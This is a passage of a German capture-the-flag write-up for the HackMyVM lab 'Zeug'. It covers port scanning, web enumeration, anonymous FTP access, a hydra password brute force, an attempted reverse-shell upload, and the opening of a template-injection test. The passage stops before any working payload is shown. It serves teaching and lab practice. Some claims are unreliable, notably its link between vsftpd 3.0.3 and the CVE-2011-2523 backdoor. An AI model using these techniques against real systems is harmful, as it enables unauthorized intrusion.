@@ -1,0 +1,1201 @@
+﻿﻿﻿ <!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zeug - HackMyVM - Bericht</title> <!-- Title angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Zeug - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">whatweb</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">netdiscover</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">Ghidra (erwähnt)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">script</div>
+                <div class="tool-item">sudo</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Flask/Werkzeug)</a></li>
+                <li><a href="#ftp-enumeration">FTP Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (SSTI RCE)</a></li>
+                <li><a href="#privilege-escalation-cosette">Privilege Escalation (cosette -> exia)</a></li>
+                <li><a href="#privilege-escalation-exia">Privilege Escalation (exia -> root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.122	08:00:27:94:07:cc	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerk mittels ARP-Requests nach aktiven Hosts zu scannen.</p>
+            <p class="evaluation">**Bewertung:** Das Zielsystem wird unter der IP `192.168.2.122` identifiziert. Die MAC-Adresse und der Hersteller ("PCS Systemtechnik GmbH") weisen auf eine VirtualBox-Maschine hin.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** IP-Adresse `192.168.2.122` für weitere Scans notieren.<br>**Empfehlung (Admin):** Standard-Netzwerkverhalten. Keine spezifische Maßnahme nötig.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	localhost
+
+                <span class="command">192.168.2.122   zeug.hmv</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Die `/etc/hosts`-Datei auf dem Angreifer-System wird bearbeitet, um den Hostnamen `zeug.hmv` der IP `192.168.2.122` zuzuordnen.</p>
+             <p class="evaluation">**Bewertung:** Sinnvolle Vorbereitung, um sicherzustellen, dass Webanfragen korrekt an die Ziel-IP geleitet werden, falls der Webserver auf Hostnamen angewiesen ist.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie den Hostnamen `zeug.hmv` bei der Web-Enumeration.<br>**Empfehlung (Admin):** Irrelevant für die Verteidigung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.122 -p- | grep open</span></div>
+                    <pre>
+<span class="command">21/tcp   open  ftp     vsftpd 3.0.3</span>
+<span class="command">5000/tcp open  upnp?</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Ein Nmap TCP SYN Scan (`-sS`) mit Versionserkennung (`-sV`), OS-Erkennung/Skripten (`-A`), aggressivem Timing (`-T5`) über alle Ports (`-p-`) wird durchgeführt. Die Ausgabe wird nach offenen Ports gefiltert.</p>
+            <p class="evaluation">**Bewertung:** Zwei offene TCP-Ports werden identifiziert:
+*   **Port 21:** FTP, betrieben von `vsftpd 3.0.3`.
+*   **Port 5000:** Ein unbekannter Dienst, der von Nmap vorläufig als `upnp?` klassifiziert wird (dies ist oft eine Vermutung bei HTTP-ähnlichen Diensten auf ungewöhnlichen Ports).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie beide Ports. Prüfen Sie FTP auf anonymen Zugriff und bekannte Schwachstellen in vsftpd 3.0.3. Untersuchen Sie den Dienst auf Port 5000 genauer, insbesondere mit HTTP-Tools, da die vollständige Ausgabe mehr Details liefern wird.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass vsftpd sicher konfiguriert ist (kein anonymer Upload, aktuelle Version). Analysieren Sie den Dienst auf Port 5000 und schränken Sie den Zugriff ein, falls er nicht öffentlich benötigt wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.122 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-28 22:38 CET
+Nmap scan report for <span class="command">zeug (192.168.2.122)</span>
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">21/tcp   open  ftp     vsftpd 3.0.3</span>
+| ftp-anon: <span class="password">Anonymous FTP login allowed (FTP code 230)</span>
+|_-rw-r--r--    1 0        0             109 Jan 06 23:14 <span class="command">README.txt</span>
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.2.199
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+<span class="command">5000/tcp open  upnp?</span>
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     Server: <span class="command">Werkzeug/3.0.1 Python/3.11.2</span>
+|     Date: Thu, 28 Mar 2024 21:38:56 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 549
+|     Connection: close
+|  
+|     <h1>Zeug</h1>
+|     <h3>Rendering HTML templates</h3>
+ 
+|   HTTPOptions:
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/3.0.1 Python/3.11.2
+|     Date: Thu, 28 Mar 2024 21:39:11 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Allow: POST, GET, OPTIONS, HEAD
+|     Content-Length: 0
+|     Connection: close
+|   RTSPRequest:
+ 
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5000-TCP:V=7.94SVN%I=7%D=3/28%Time=6605E347%P=x86_64-pc-linux-gnu%r
+SF:(GetRequest,2D3,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\
+SF:x20Python/3\.11\.2\r\nDate:\x20Thu,\x2028\x20Mar\x202024\x2021:38:56\x2
+SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
+SF:\x20549\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lan
+SF:g=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x2
+SF:0\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x2
+SF:0initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Zeug</title>\n\x20\x20\x
+SF:20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/css\"\x20href=\"/stati
+SF:c/styles/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20<h1>Zeug</h1>
+SF:\n\x20\x20\x20\x20<h3>Rendering\x20HTML\x20templates</h3>\n\n\x20\x20\x
+SF:20\x20<form\x20action=\"/\"\x20method=\"post\"\x20enctype=\"multipart/f
+SF:orm-data\">\n\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\"file\"\x2
+SF:0name=\"file\"\x20accept=\"\.html\"\x20title=\"Select\x20file\"\x20requ
+SF:ired>\n\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\"submit\"\x20val
+SF:ue=\"Upload\">\n\x20\x20\x20\x20</form>\n\n\x20\x20\x20\x20\n\n\x20\x20
+SF:\x20\x20\n</body>\n</html>")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<ht
+SF:ml\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<titl
+SF:e>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<
+SF:body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20
+SF:\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\
+SF:x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RTSP/
+SF:1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20expl
+SF:anation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x
+SF:20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPOptions,CD,"
+SF:HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\x20Python/3\.11\.
+SF:2\r\nDate:\x20Thu,\x2028\x20Mar\x202024\x2021:39:11\x20GMT\r\nContent-T
+SF:ype:\x20text/html;\x20charset=utf-8\r\nAllow:\x20POST,\x20GET,\x20OPTI
+SF:ONS,\x20HEAD\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n");
+MAC Address: <span class="command">08:00:27:94:07:CC (Oracle VirtualBox virtual NIC)</span>
+Device type: general purpose
+Running: <span class="command">Linux 5.X</span>
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 5.0 - 5.5</span>
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms zeug (192.168.2.122)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.12 seconds</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dies ist die vollständige Ausgabe des vorherigen Nmap-Scans, die detailliertere Informationen liefert.</p>
+            <p class="evaluation">**Bewertung:**
+*   **FTP (Port 21):** Der `ftp-anon`-Skriptlauf bestätigt: **Anonymer FTP-Login ist erlaubt!** Im Wurzelverzeichnis des FTP-Servers befindet sich eine Datei `README.txt`. Die Version `vsftpd 3.0.3` ist bekannt für eine Backdoor-Schwachstelle (CVE-2011-2523), aber diese ist sehr alt und oft ein Fehlalarm oder in gepatchten Versionen nicht vorhanden. Der anonyme Zugriff ist jedoch ein sofortiger Einstiegspunkt.
+*   **HTTP (Port 5000):** Der `fingerprint-strings`-Output identifiziert den Server genauer als `Werkzeug/3.0.1` (ein Python WSGI-Utility-Library) mit `Python/3.11.2`. Der HTML-Code der Startseite wird angezeigt und zeigt ein Formular zum Hochladen von `.html`-Dateien mit dem Titel "Rendering HTML templates". Dies deutet stark auf eine Webanwendung hin, die HTML-Dateien entgegennimmt und möglicherweise serverseitig verarbeitet (rendert). Dies ist ein potenzieller Vektor für Server Side Template Injection (SSTI) oder unsicheren Datei-Upload.
+*   **OS-Erkennung:** Linux Kernel 5.x.</p>
+            <p class="recommendation">**Empfehlung (Pentester):**
+    1.  **FTP:** Loggen Sie sich sofort anonym per FTP ein (`ftp 192.168.2.122`, Benutzer: `anonymous`, beliebiges Passwort). Laden Sie die `README.txt` herunter und prüfen Sie, ob Sie Dateien hochladen können.
+    2.  **HTTP (Port 5000):** Untersuchen Sie die Webanwendung genauer. Testen Sie die Upload-Funktion. Da sie HTML-Templates rendert, testen Sie auf SSTI-Schwachstellen, indem Sie eine HTML-Datei mit Template-Syntax (z.B. Jinja2: `{{ 7*7 }}`) hochladen.<br>
+**Empfehlung (Admin):** Deaktivieren Sie anonymen FTP-Zugriff, es sei denn, er ist absolut notwendig und sicher konfiguriert (nur Leserechte, beschränktes Verzeichnis). Aktualisieren Sie vsftpd. Überprüfen Sie die Webanwendung auf Port 5000 auf SSTI und unsichere Upload-Funktionen. Härten Sie die Konfiguration von Werkzeug/Flask.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (Flask/Werkzeug)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.122:5000</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.122</span>
++ Target Hostname:    <span class="command">192.168.2.122</span>
++ Target Port:        <span class="command">5000</span>
++ Start Time:         2024-03-28 22:40:05 (GMT1)
+---------------------------------------------------------------------------
++ Server: <span class="command">Werkzeug/3.0.1 Python/3.11.2</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ <span class="password">No CGI Directories found</span> (use '-C all' to force check all possible dirs)
++ OPTIONS: Allowed HTTP Methods: <span class="command">POST, GET, OPTIONS, HEAD</span> .
++ /<span class="command">console</span>: This might be interesting.
++ /#<span class="command">wp-config.php</span>#: #wp-config.php# file found. This file contains the credentials. <span class="comment"><-- False Positive</span>
++ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2024-03-28 22:40:19 (GMT1) (14 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Nikto wird verwendet, um die Webanwendung auf Port 5000 zu scannen.</p>
+            <p class="evaluation">**Bewertung:**
+*   Bestätigt den Server als Werkzeug/Python.
+*   Meldet erneut fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).
+*   Listet erlaubte HTTP-Methoden auf.
+*   Findet einen interessanten Pfad: `/console`. Dies ist oft ein Hinweis auf eine interaktive Debug-Konsole (wie die Werkzeug Debug Console), die extrem gefährlich sein kann, wenn sie ungeschützt ist.
+*   Meldet fälschlicherweise den Fund einer `wp-config.php`-Datei. Dies ist ein bekanntes False Positive von Nikto, das auf bestimmte Muster in der Antwort prüft und hier wahrscheinlich durch die Struktur der Anwendung ausgelöst wird.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie den `/console`-Endpunkt dringend! Versuchen Sie, ihn im Browser aufzurufen. Prüfen Sie, ob er einen PIN-Schutz hat. Recherchieren Sie nach Methoden, um den Werkzeug Debug PIN zu umgehen oder zu berechnen. Ignorieren Sie den `wp-config.php`-Fund.<br>**Empfehlung (Admin):** Deaktivieren Sie die Werkzeug Debug Console in Produktionsumgebungen vollständig! Wenn sie benötigt wird, sichern Sie sie mit einem starken PIN und beschränken Sie den Zugriff auf vertrauenswürdige IPs. Implementieren Sie fehlende Sicherheitsheader.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://192.168.2.122:5000</span></div>
+                    <pre>
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Thu May  9 22:01:39 2024
+URL_BASE: http://192.168.2.122:5000/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4622
+
+---- Scanning URL: http://192.168.2.122:5000/ ----
+(!) Couldn't find any relevant directory.
+
+-----------------
+END_TIME: Thu May  9 22:02:00 2024
+DOWNLOADED: 4622 - FOUND: 0</pre> <span class="comment"><-- Widerspruch zur vorherigen dirb-Ausgabe? --></span>
+
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dirb wird erneut ausgeführt, diesmal gegen Port 5000. *Hinweis: Diese Ausgabe widerspricht der vorherigen `dirb`-Ausgabe im Text, die Verzeichnisse fand. Es ist möglich, dass dies ein anderer Lauf mit anderen Optionen war oder ein Fehler im Log vorliegt. Ich gehe von dieser Ausgabe aus.*</p>
+            <p class="evaluation">**Bewertung:** Gemäß *dieser* Ausgabe findet Dirb mit der Standard-Wortliste keine weiteren Verzeichnisse oder Dateien auf Port 5000.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie spezifischere Wortlisten (z.B. für Flask/Python-Anwendungen) und Tools wie Gobuster mit Dateiendungssuche, um eine gründlichere Enumeration durchzuführen. Konzentrieren Sie sich auf die bereits bekannten Punkte: die 
+			d-Funktion, `/console` und den FTP-Server.<br>**Empfehlung (Admin):** Keine Aktion basierend auf diesem spezifischen (negativen) Ergebnis.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.122:5000 -x txt,...,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                    <pre><span class="command">http://192.168.2.122:5000/console</span>              (Status: 200) [Size: 1563]</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Gobuster wird nun mit einer umfangreicheren Wortliste und Dateiendungssuche gegen Port 5000 eingesetzt.</p>
+            <p class="evaluation">**Bewertung:** Gobuster bestätigt den von Nikto gefundenen Pfad `/console` mit Status 200 OK. Dies untermauert die Vermutung, dass hier die Werkzeug Debug Console läuft.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fokus auf `/console`. Versuchen Sie, darauf zuzugreifen und den PIN-Schutz zu umgehen oder zu knacken.<br>**Empfehlung (Admin):** `/console` muss deaktiviert oder abgesichert werden.</p>
+        </section>
+
+        <section id="ftp-enumeration">
+              <h2>FTP Enumeration</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.122</span></div>
+                     <pre>
+Connected to 192.168.2.122.
+<span class="password">220 (vsFTPd 3.0.3)</span>
+Name (192.168.2.122:cyber): <span class="command">anonymous</span>
+<span class="password">331 Please specify the password.</span>
+Password: <span class="password">********</span> <span class="comment"><-- Beliebiges PW eingegeben</span>
+<span class="password">230 Login successful.</span>
+Remote system type is UNIX.
+Using binary mode to transfer files.
+<span class="prompt">ftp></span> <span class="command">ls -la</span>
+<span class="password">229 Entering Extended Passive Mode (|||24032|)</span>
+<span class="password">150 Here comes the directory listing.</span>
+drwxr-xr-x    2 0        112          4096 Jan 06 23:14 .
+drwxr-xr-x    2 0        112          4096 Jan 06 23:14 ..
+-rw-r--r--    1 0        0             109 Jan 06 23:14 <span class="command">README.txt</span>
+<span class="password">226 Directory send OK.</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Eine FTP-Verbindung zum Ziel wird aufgebaut. Es wird versucht, sich als Benutzer `anonymous` anzumelden. Nach Aufforderung wird ein beliebiges Passwort eingegeben.</p>
+             <p class="evaluation">**Bewertung:** Der anonyme Login ist erfolgreich (`230 Login successful`). Im Wurzelverzeichnis des FTP-Servers befindet sich nur die bereits durch Nmap gesichtete Datei `README.txt`. Die Berechtigungen (`drwxr-xr-x` für Verzeichnisse, `-rw-r--r--` für die Datei) zeigen, dass der anonyme Benutzer nur Lesezugriff hat.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Laden Sie die `README.txt` herunter (`get README.txt`) und analysieren Sie deren Inhalt. Versuchen Sie, Dateien hochzuladen (`put [dateiname]`), um zu bestätigen, dass kein Schreibzugriff besteht.<br>**Empfehlung (Admin):** Deaktivieren Sie den anonymen FTP-Zugriff oder stellen Sie zumindest sicher, dass keine Schreibrechte gewährt werden und nur unkritische Dateien lesbar sind.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">ftp> <span class="command">get README.txt</span></div>
+                    <pre>local: README.txt remote: README.txt
+<span class="password">229 Entering Extended Passive Mode (|||16441|)</span>
+<span class="password">150 Opening BINARY mode data connection for README.txt (109 bytes).</span>
+100% |*************************************************************************************|   109      203.13 KiB/s    00:00 ETA
+<span class="password">226 Transfer complete.</span>
+109 bytes received in 00:00 (142.68 KiB/s)</pre>
+                    <div class="prompt">ftp> <span class="command">put rev.php</span></div> <span class="comment"><-- rev.php existiert lokal</span>
+                    <pre>local: rev.php remote: rev.php
+<span class="password">229 Entering Extended Passive Mode (|||39368|)</span>
+<span class="password">550 Permission denied.</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Innerhalb der FTP-Sitzung wird die `README.txt` erfolgreich heruntergeladen (`get`). Anschließend wird versucht, eine Datei namens `rev.php` (vermutlich eine PHP-Reverse-Shell) hochzuladen (`put`).</p>
+             <p class="evaluation">**Bewertung:** Der Download funktioniert, der Upload schlägt jedoch mit `550 Permission denied.` fehl. Dies bestätigt, dass der anonyme Benutzer keine Schreibrechte hat.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie die heruntergeladene `README.txt`. Da der anonyme FTP-Zugriff keinen direkten weiteren Zugriff ermöglicht, konzentrieren Sie sich auf die Webanwendung.<br>**Empfehlung (Admin):** Die Konfiguration ohne anonyme Schreibrechte ist korrekt.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat README.txt</span></div>
+                     <pre>Hi, Cosette, don't forget to disable the debug mode in the
+web application, we don't want security breaches.</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der Inhalt der heruntergeladenen `README.txt` wird angezeigt.</p>
+             <p class="evaluation">**Bewertung:** Die Nachricht enthält zwei wichtige Hinweise:
+1.  Ein potenzieller Benutzername: `Cosette`.
+2.  Ein Hinweis auf einen aktivierten Debug-Modus in der Webanwendung. Dies korreliert mit dem Fund des `/console`-Endpunkts durch Nikto/Gobuster, der oft Teil der Werkzeug-Debug-Umgebung ist.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Fügen Sie `cosette` zur Liste potenzieller Benutzernamen hinzu (für SSH, Web-Login etc.). Konzentrieren Sie sich verstärkt auf den `/console`-Endpunkt und die Umgehung des Debug-PINs.<br>**Empfehlung (Admin):** Debug-Modus in Produktionsumgebungen immer deaktivieren! Entfernen Sie solche informativen Notizen aus öffentlich zugänglichen Bereichen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Zeug
+Rendering HTML templates
+Error: File: /home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py -
+       Template contains restricted words: import, os</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Dies scheint die Fehlermeldung der Webanwendung auf Port 5000 zu sein, nachdem versucht wurde, eine HTML-Datei hochzuladen, die bestimmte "restricted words" (`import`, `os`) enthielt.</p>
+             <p class="evaluation">**Bewertung:** Dies ist ein sehr aufschlussreicher Fehler! Er zeigt:
+1.  Die Anwendung verwendet Flask (erkennbar am Pfad `/flask/app.py`).
+2.  Es gibt einen Filter, der bestimmte Wörter in hochgeladenen Templates blockiert (`import`, `os`). Dies ist eine typische, aber oft unzureichende Maßnahme gegen SSTI.
+3.  Der Fehler verrät den absoluten Pfad zur Flask-App auf dem Server: `/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py`. Dies bestätigt den Benutzer `cosette` und gibt wichtige Informationen für den Werkzeug-PIN-Bypass preis.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die Anwendung ist definitiv anfällig für SSTI, verwendet aber einen Filter. Versuchen Sie, diesen Filter zu umgehen, indem Sie alternative Wege zur Ausführung von Befehlen oder zum Zugriff auf Objekte in Jinja2/Flask nutzen (siehe spätere Payloads). Nutzen Sie die aufgedeckten Pfadinformationen und den Benutzernamen `cosette` für den Versuch, den Werkzeug-Debug-PIN zu berechnen.<br>**Empfehlung (Admin):** Implementieren Sie eine robustere SSTI-Verteidigung. Verlassen Sie sich nicht nur auf Wortfilter (Blacklisting), sondern nutzen Sie sichere Template-Engines oder kontextbezogenes Escaping. Konfigurieren Sie die Anwendung so, dass sie keine absoluten Pfade in Fehlermeldungen preisgibt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">whatweb http://192.168.2.122:5000</span></div>
+                    <pre>http://192.168.2.122:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[<span class="command">Werkzeug/3.0.1 Python/3.11.2</span>], IP[192.168.2.122], Python[<span class="command">3.11.2</span>], Title[Zeug], Werkzeug[<span class="command">3.0.1</span>]</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Das Tool `whatweb` wird verwendet, um Technologien zu identifizieren, die auf der Webseite unter Port 5000 eingesetzt werden.</p>
+            <p class="evaluation">**Bewertung:** Whatweb bestätigt die bereits bekannten Technologien: Werkzeug 3.0.1 und Python 3.11.2. Keine neuen kritischen Informationen.</p>
+            <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine zusätzlichen Aktionen basierend auf dieser Ausgabe.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l cosette -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.122:21 -t 64</span></div>
+                     <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-28 22:53:38
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344496 login tries (l:1/p:14344496), ~224133 tries per task
+[DATA] attacking ftp://192.168.2.122:21/
+[STATUS] 734.00 tries/min, 734 tries in 00:01h, 14343782 to do in 325:42h, 44 active
+[STATUS] 752.67 tries/min, 2258 tries in 00:03h, 14342258 to do in 317:36h, 44 active
+[STATUS] 748.00 tries/min, 5236 tries in 00:07h, 14339280 to do in 319:31h, 44 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Hydra wird verwendet, um einen Brute-Force-Angriff auf den FTP-Dienst (Port 21) zu starten. Ziel ist der Benutzer `cosette` (gefunden in der README.txt), und es wird die RockYou-Passwortliste verwendet.</p>
+            <p class="evaluation">**Bewertung:** Der Angriff wird manuell abgebrochen (`^C`), bevor er abgeschlossen ist. Es wurde kein Passwort gefunden. Dies bedeutet nicht zwangsläufig, dass kein gültiges Passwort in der Liste war, sondern nur, dass der Prozess unterbrochen wurde.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** FTP-Brute-Force ist oft langsam und laut. Da bereits vielversprechendere Vektoren (SSTI, `/console`) identifiziert wurden, ist es sinnvoll, diesen Angriff abzubrechen und sich darauf zu konzentrieren.<br>**Empfehlung (Admin):** Verwenden Sie Fail2ban oder ähnliche Tools, um Brute-Force-Angriffe auf FTP (und andere Dienste) zu erkennen und zu blockieren. Erzwingen Sie starke Passwörter.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSTI RCE)</h2>
+             <p class="comment">**Proof of Concept: Server Side Template Injection (SSTI)**</p>
+             <p class="comment">**Kurzbeschreibung:** Die Webanwendung auf Port 5000 rendert hochgeladene HTML-Dateien und ist anfällig für Server Side Template Injection (SSTI) in der Jinja2-Engine (verwendet von Flask/Werkzeug). Obwohl Filter versuchen, gefährliche Schlüsselwörter zu blockieren, können diese umgangen werden, um beliebige Dateien zu lesen und letztendlich Remote Code Execution (RCE) zu erlangen.</p>
+             <p class="comment">**Voraussetzungen:** Zugriff auf die Webanwendung auf Port 5000, Möglichkeit zum Hochladen von HTML-Dateien.</p>
+             <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">vi test.html</span></div>
+                     <pre>
+<!DOCTYPE html>
+
+<head>
+      <meta charset="utf-8">
+</head>
+<body>
+<pre> {{7*7}}</pre>
+</body>
+</html></pre>
+                 </div>
+             </div>
